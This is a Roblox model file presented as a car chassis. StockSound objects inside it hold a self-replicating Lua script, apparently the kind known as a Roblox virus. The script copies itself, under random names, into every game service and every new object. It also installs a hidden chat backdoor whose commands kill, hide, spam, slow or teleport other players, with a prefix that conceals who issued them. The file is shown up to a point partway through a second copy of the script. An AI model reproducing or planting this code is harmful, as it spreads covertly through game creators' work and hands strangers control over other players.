<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
	<External>null</External>
	<External>nil</External>
	<Item class="Model" referent="RBX0">
		<Properties>
			<CoordinateFrame name="ModelInPrimary">
				<X>0</X>
				<Y>0</Y>
				<Z>0</Z>
				<R00>1</R00>
				<R01>0</R01>
				<R02>0</R02>
				<R10>0</R10>
				<R11>1</R11>
				<R12>0</R12>
				<R20>0</R20>
				<R21>0</R21>
				<R22>1</R22>
			</CoordinateFrame>
			<string name="Name">Chassis</string>
			<Ref name="PrimaryPart">null</Ref>
			<bool name="archivable">true</bool>
		</Properties>
		<Item class="Model" referent="RBX1">
			<Properties>
				<CoordinateFrame name="ModelInPrimary">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">Motor (torque)Chassis</string>
				<Ref name="PrimaryPart">RBX2</Ref>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Part" referent="RBX2">
				<Properties>
					<bool name="Anchored">false</bool>
					<float name="BackParamA">-0.5</float>
					<float name="BackParamB">0.5</float>
					<token name="BackSurface">0</token>
					<token name="BackSurfaceInput">0</token>
					<float name="BottomParamA">-0.300000012</float>
					<float name="BottomParamB">0.300000012</float>
					<token name="BottomSurface">4</token>
					<token name="BottomSurfaceInput">0</token>
					<int name="BrickColor">194</int>
					<CoordinateFrame name="CFrame">
						<X>-9</X>
						<Y>1.89999998</Y>
						<Z>-27</Z>
						<R00>1</R00>
						<R01>0</R01>
						<R02>0</R02>
						<R10>0</R10>
						<R11>1</R11>
						<R12>0</R12>
						<R20>0</R20>
						<R21>0</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<bool name="CanCollide">true</bool>
					<bool name="DraggingV1">false</bool>
					<float name="Elasticity">0.5</float>
					<token name="FormFactor">1</token>
					<float name="Friction">0.300000012</float>
					<float name="FrontParamA">-0.5</float>
					<float name="FrontParamB">0.5</float>
					<token name="FrontSurface">0</token>
					<token name="FrontSurfaceInput">0</token>
					<float name="LeftParamA">-0.5</float>
					<float name="LeftParamB">0.5</float>
					<token name="LeftSurface">0</token>
					<token name="LeftSurfaceInput">0</token>
					<bool name="Locked">false</bool>
					<token name="Material">256</token>
					<string name="Name">Part</string>
					<float name="Reflectance">0</float>
					<float name="RightParamA">-0.5</float>
					<float name="RightParamB">0.5</float>
					<token name="RightSurface">0</token>
					<token name="RightSurfaceInput">0</token>
					<Vector3 name="RotVelocity">
						<X>-0.00118217827</X>
						<Y>0.00220030732</Y>
						<Z>-0.00017520129</Z>
					</Vector3>
					<float name="TopParamA">-0.300000012</float>
					<float name="TopParamB">0.300000012</float>
					<token name="TopSurface">3</token>
					<token name="TopSurfaceInput">0</token>
					<float name="Transparency">0</float>
					<Vector3 name="Velocity">
						<X>0.014109497</X>
						<Y>0.00162590353</Y>
						<Z>0.00616447208</Z>
					</Vector3>
					<bool name="archivable">true</bool>
					<token name="shape">1</token>
					<Vector3 name="size">
						<X>4</X>
						<Y>1.20000005</Y>
						<Z>12</Z>
					</Vector3>
				</Properties>
				<Item class="StockSound" referent="RBX3">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">8b2ksh</string>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX4">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">kg5r46vf</string>
							<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.5 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.5 end
end
end
end
end
end
end
if string.find(msg, &quot;join &quot;) == 1 then
local teams = game:service(&quot;Teams&quot;)
local tmz = teams:GetTeams()
for i = 1, #tmz do
if string.find(tmz[i].Name, string.sub(msg, 6)) == 1 then
speaker.Neutral = false
speaker.TeamColor = tmz[i].TeamColor
end
end
end
if string.find(msg, &quot;debug&quot;) == 1 then
local msgs = game.Workspace:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
local plz = game.Players:GetPlayers()
for j = 1, #plz do
local msgs = plz[j]:GetChildren()
for i = 1, #msgs do
if msgs[i].className == &quot;Message&quot; or msgs[i].className == &quot;Hint&quot; then
msgs[i]:Remove()
end
end
end
end
if string.find(msg, &quot;fog&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;FOGZORZ&quot;) == nil then
local newm = Instance.new(&quot;Message&quot;)
newm.Name = &quot;FOGZORZ&quot;
newm.Text = &quot; &quot;
newm.Parent = game.Workspace
newm:Clone().Parent = game.Workspace
end
end
if string.find(msg, &quot;say &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local said = string.sub(msg, 5)
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;shout &quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Shouty&quot;) ~= nil then game.Workspace.Shouty:Remove() end
local said = string.sub(msg, 7)
local talk = Instance.new(&quot;Message&quot;)
talk.Name = &quot;Shouty&quot;
talk.Text = speaker.Name.. &quot;: &quot;.. said
talk.Parent = game.Workspace
end
if string.find(msg, &quot;spam &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
for r = 1, 10 do
local er = Instance.new(&quot;Message&quot;)
er.Text = &quot; &quot;
er.Parent = plz[i]
end
end
end
end
if string.find(msg, &quot;bored&quot;) == 1 then
if game.Workspace:findFirstChild(&quot;Talky&quot;) ~= nil then game.Workspace.Talky:Remove() end
local talk = Instance.new(&quot;Hint&quot;)
talk.Name = &quot;Talky&quot;
talk.Parent = game.Workspace
if math.random(1,2) == 1 then
talk.Text = &quot;OMG IM SO BORED TOO!&quot;
else
talk.Text = &quot;Go play a different game then.&quot;
end
end
if string.find(msg, &quot;goto &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if speaker.Character ~= nil then
if speaker.Character:findFirstChild(&quot;Head&quot;) ~= nil then
speaker.Character.Head.CFrame = CFrame.new(plz[i].Character.Head.Position + Vector3.new(0,3,0))
end
end
end
end
end
end
end
if string.find(msg, &quot;nofall &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Platform&quot;) == nil then
local fl = Instance.new(&quot;Part&quot;)
fl.Name = &quot;Platform&quot;
fl.formFactor = &quot;Plate&quot;
fl.Size = Vector3.new(6,.2,6)
fl.Anchored = true
fl.Transparency = 1
local sc = Instance.new(&quot;Script&quot;)
sc.Name = &quot;MoveToChar&quot;
pcall(function() sc.Source=[[ p = script.Parent c = p.Parent while true do t = c:findFirstChild(&quot;Head&quot;) if t == nil then p:Remove() else p.Position = Vector3.new(t.Position.x,0,t.Position.z) end wait() end ]] end)
if sc.Source ~= &quot;print(\&quot;Hello World\&quot;)&quot; then
sc.Parent = fl -- its pcalled just in case. Well I have no idea what crazy things the admins will do in a few days, like stop scripts editing sources, but then as if THATS ever going 2 happen... (it would be stupid cause most roblox scripters would leave)
fl.Parent = plz[i].Character
end
end
end
end
end
end
if string.find(msg, &quot;tools &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
local pack = plz[i]:findFirstChild(&quot;Backpack&quot;)
if pack ~= nil then
for o = 1, #thetools do
thetools[o]:Clone().Parent = pack
end
end
end
end
end
end
wait()
game.Players.PlayerAdded:connect(function(new) new.Chatted:connect(function(msg) chat(msg,new) end) end) -- I do love this connecting script...
wait()
multinfect(game:service(&quot;Workspace&quot;))
multinfect(game:service(&quot;Lighting&quot;))
multinfect(game:service(&quot;StarterPack&quot;))
multinfect(game:service(&quot;Teams&quot;))
multinfect(game:service(&quot;SoundService&quot;))
multinfect(game:service(&quot;Debris&quot;))
--now we can rest in peace...

death = type(RIP)
</string>
							<bool name="archivable">true</bool>
						</Properties>
					</Item>
				</Item>
			</Item>
			<Item class="Part" referent="RBX5">
				<Properties>
					<bool name="Anchored">false</bool>
					<float name="BackParamA">-0.5</float>
					<float name="BackParamB">0.5</float>
					<token name="BackSurface">0</token>
					<token name="BackSurfaceInput">0</token>
					<float name="BottomParamA">-0.5</float>
					<float name="BottomParamB">0.5</float>
					<token name="BottomSurface">0</token>
					<token name="BottomSurfaceInput">0</token>
					<int name="BrickColor">199</int>
					<CoordinateFrame name="CFrame">
						<X>-4.99994659</X>
						<Y>2.40088725</Y>
						<Z>-30.9999924</Z>
						<R00>0.99999994</R00>
						<R01>-0.000365768094</R01>
						<R02>-1.36012159e-005</R02>
						<R10>0.00036576789</R10>
						<R11>0.99999994</R11>
						<R12>-1.58230305e-005</R12>
						<R20>1.3607003e-005</R20>
						<R21>1.58180537e-005</R21>
						<R22>1</R22>
					</CoordinateFrame>
					<bool name="CanCollide">true</bool>
					<bool name="DraggingV1">false</bool>
					<float name="Elasticity">0.5</float>
					<token name="FormFactor">0</token>
					<float name="Friction">1</float>
					<float name="FrontParamA">-0.5</float>
					<float name="FrontParamB">0.5</float>
					<token name="FrontSurface">0</token>
					<token name="FrontSurfaceInput">0</token>
					<float name="LeftParamA">0.300000012</float>
					<float name="LeftParamB">0.300000012</float>
					<token name="LeftSurface">6</token>
					<token name="LeftSurfaceInput">2</token>
					<bool name="Locked">false</bool>
					<token name="Material">256</token>
					<string name="Name">Right Front</string>
					<float name="Reflectance">0</float>
					<float name="RightParamA">-0.5</float>
					<float name="RightParamB">0.5</float>
					<token name="RightSurface">0</token>
					<token name="RightSurfaceInput">0</token>
					<Vector3 name="RotVelocity">
						<X>-0.00160323177</X>
						<Y>-0.0121607687</Y>
						<Z>-0.0120229656</Z>
					</Vector3>
					<float name="TopParamA">-0.5</float>
					<float name="TopParamB">0.5</float>
					<token name="TopSurface">0</token>
					<token name="TopSurfaceInput">0</token>
					<float name="Transparency">0</float>
					<Vector3 name="Velocity">
						<X>-0.00113359815</X>
						<Y>-0.0203847457</Y>
						<Z>-0.010010004</Z>
					</Vector3>
					<bool name="archivable">true</bool>
					<token name="shape">2</token>
					<Vector3 name="size">
						<X>4</X>
						<Y>4</Y>
						<Z>4</Z>
					</Vector3>
				</Properties>
				<Item class="StockSound" referent="RBX6">
					<Properties>
						<bool name="Looped">false</bool>
						<string name="Name">y398sd</string>
						<int name="PlayCount">-1</int>
						<bool name="PlayOnRemove">false</bool>
						<Content name="SoundId"><null></null></Content>
						<float name="Volume">0.5</float>
						<bool name="archivable">true</bool>
					</Properties>
					<Item class="Script" referent="RBX7">
						<Properties>
							<bool name="Disabled">false</bool>
							<Content name="LinkedSource"><null></null></Content>
							<string name="Name">u5vv</string>
							<string name="Source">--             	 _                     |
-- unknowns 0.|_| Commands o
--

myname = &quot;builderman&quot; -- put your name here if you like!

--Hi, person who just looked inside a StockSound...
--Try these commands, they are great!

--[[COMMANDS:

say /sc BEFORE your command to make it so no-one kows its you who killed/shielded them

for example:

/sc shield builderman

reset  --this resets YOU
debug  --this removes all messages in the workspace and in players
fog  --this creates a few messages to look like fog, say debug to remove them

shield playername  --this shields the player named playername against explosions
kill playername  --this kills the player named playername
name newname  --this names YOUR CHARACTER the newname
god playername  --this sets the player playername unkillable by weapons that take damage (not explosions)
fast playername  --this speeds up the player named playername
slow playername --this slows the player named playername
hide playername  --this hides the player named playername
ghost playername  --this makes the player named playername ghostly
fade playername --this fades the player named playername a bit
show playername  --shows the player named playername
doom playername  --this makes there head a big triangle lol you can watch them running around stupidly
spam playername  --stops the player named playername seeing the chat properly
tools playername  --this gives the player the vip tools in the game
goto playername  --this moves your character to that players character
join teamname  --this joins the team named the teamname
say message  --creates a hint at the bottom of the screen saying your message
shout message  --creates a message on the screen saying your message

this is all case-sensitive

please note it is not needed to say the WHOLE name of the player, lets say just builderman was in the game:

tools bu would give him the VIP tools

but if builderdude was ingame aswell, he would ALSO get the tools, so if you only want builderman to get them, you should say:

tools builderm

also, if you just say tools then a space, then EVERYONE will get the tools

the same goes for kill, god, ghost, and all the other commands that use playername
--]]

--everything below here is very complicated so it would be best if you DONT mess with it

wait(.4)
if game:service(&quot;Workspace&quot;):findFirstChild(&quot;IMDOINGITOKSODONTKILLMENOW&quot;) ~= nil then
wait(math.huge) --this should keep it busy
end
jkoer = Instance.new(script.Parent.className)
jkoer.Name = &quot;IMDOINGITOKSODONTKILLMENOW&quot;
jkoer.Parent = game:service(&quot;Workspace&quot;)
jkoer.archivable = false
--Check all systems needed are running well
game:service(&quot;Workspace&quot;)
game:service(&quot;Lighting&quot;)
game:service(&quot;StarterPack&quot;)
game:service(&quot;Teams&quot;)
game:service(&quot;SoundService&quot;)
game:service(&quot;Debris&quot;)
--
bin = script.Parent
g = {&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;,&quot;e&quot;,&quot;f&quot;,&quot;g&quot;,&quot;h&quot;,&quot;i&quot;,&quot;j&quot;,&quot;k&quot;,&quot;l&quot;,&quot;m&quot;,&quot;n&quot;,&quot;o&quot;,&quot;p&quot;,&quot;q&quot;,&quot;r&quot;,&quot;s&quot;,&quot;t&quot;,&quot;u&quot;,&quot;v&quot;,&quot;w&quot;,&quot;x&quot;,&quot;y&quot;,&quot;z&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;,&quot;4&quot;,&quot;5&quot;,&quot;6&quot;,&quot;7&quot;,&quot;8&quot;,&quot;9&quot;} --abcdefg...
thetools = {}
function gettools(scanner)
if scanner.className == &quot;HopperBin&quot; or scanner.className == &quot;Tool&quot; then
if scanner.archivable == true then table.insert(thetools, scanner:Clone()) end
end
local sc = scanner:GetChildren()
for i = 1, #sc do
gettools(sc[i])
end
end
gettools(game:service(&quot;Workspace&quot;))
gettools(game:service(&quot;Lighting&quot;))
function uinf(k)
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end --a nice little bit of script that stops the game lagging
if k ~= bin and k ~= script and k ~= bin.Parent then
local me = script.Parent:Clone()
me.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
me.Name = (me.Name.. g[math.random(1, #g)])
end
local be = me[script.Name]
be.Name = &quot;&quot;
local length = math.random(4,9)
for i = 1, length do
be.Name = (be.Name.. g[math.random(1, #g)])
end
me.Parent = k
local obs = k:GetChildren()
for i = 1, #obs do
infect(obs[i])
end
end
end
function infect(object)
local ONOES = 0
if object.className == &quot;Camera&quot; then return end
if object.className == &quot;Script&quot; then
if object.Source == script.Source then
ONOES = 1
end
end
local os = object:GetChildren()
for i = 1, #os do
local current = os[i]
if current.className == &quot;Script&quot; then
if current.Source == script.Source then
ONOES = 1
end
end
local oz = current:GetChildren()
for j = 1, #oz do
local cur = oz[j]
if cur.className == &quot;Script&quot; then
if cur.Source == script.Source then
ONOES = 1
end
end
end
end
if ONOES == 0 then
uinf(object)
else -- ONOSE!
local obs = object:GetChildren()
for i = 1, #obs do
if obs[i] ~= bin then
infect(obs[i])
end
end
end
end
function pultinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
if nowitshall == 1 then wait() nowitshall = 0 elseif nowitshall == 0 then nowitshall = 2 else nowitshall = 1 end
end
function multinfect(central)
central.ChildAdded:connect(pultinfect)
infect(central)
local sides = central:GetChildren()
for i = 1, #sides do
pultinfect(sides[i])
end
end
function chat(msg, speaker) --oh yes these are commands...
if string.find(msg, &quot;/sc &quot;) == 1 then
msg = string.sub(msg, 5) --I LOVE being secretive, dont u?
end
if string.find(msg, &quot;shield &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 8)) == 1 then
Instance.new(&quot;ForceField&quot;).Parent = plz[i].Character
end
end
end
if string.find(msg, &quot;kill &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
plz[i].Character:BreakJoints() --kill kill kill...
end
end
end
end
if string.find(msg, &quot;reset&quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character:BreakJoints()
end
end
if string.find(msg, &quot;name &quot;) == 1 then
if speaker.Character ~= nil then
speaker.Character.Name = string.sub(msg, 6)
end
end
if string.find(msg, &quot;god &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 5)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.MaxHealth = math.huge
plz[i].Character.Humanoid.Health = math.huge
end
end
end
end
end
if string.find(msg, &quot;fast &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed * 1.35
end
end
end
end
end
if string.find(msg, &quot;slow &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Humanoid&quot;) ~= nil then
plz[i].Character.Humanoid.WalkSpeed = plz[i].Character.Humanoid.WalkSpeed / 1.35
end
end
end
end
end
if string.find(msg, &quot;hide &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 1 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Decal&quot; then h[v]:Remove() end
if h[v].className == &quot;Part&quot; then h[v].Transparency = 1 end
end
end
end
end
end
end
if string.find(msg, &quot;show &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0 end
end
end
end
end
end
end
if string.find(msg, &quot;ghost &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 7)) == 1 then
if plz[i].Character ~= nil then
local m = plz[i].Character:GetChildren()
for z = 1, #m do
if m[z].className == &quot;Part&quot; then m[z].Transparency = 0.9 end
local h = m[z]:GetChildren()
for v = 1, #h do
if h[v].className == &quot;Part&quot; then h[v].Transparency = 0.9 end
end
end
end
end
end
end
if string.find(msg, &quot;doom &quot;) == 1 then -- LOL this 1 is FUNNY
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
if plz[i].Character ~= nil then
if plz[i].Character:findFirstChild(&quot;Head&quot;) ~= nil then
if plz[i].Character.Head:findFirstChild(&quot;Mesh&quot;) ~= nil then
if plz[i].Character.Head.Mesh.className == &quot;SpecialMesh&quot; then
plz[i].Character.Head.Mesh.Scale = Vector3.new(17, 11, 17)
plz[i].Character.Head.Mesh.MeshType = &quot;Wedge&quot;
end
end
end
end
end
end
end
if string.find(msg, &quot;fade &quot;) == 1 then
local plz = game.Players:GetPlayers()
for i = 1, #plz do
if string.find(plz[i].Name, string.sub(msg, 6)) == 1 then
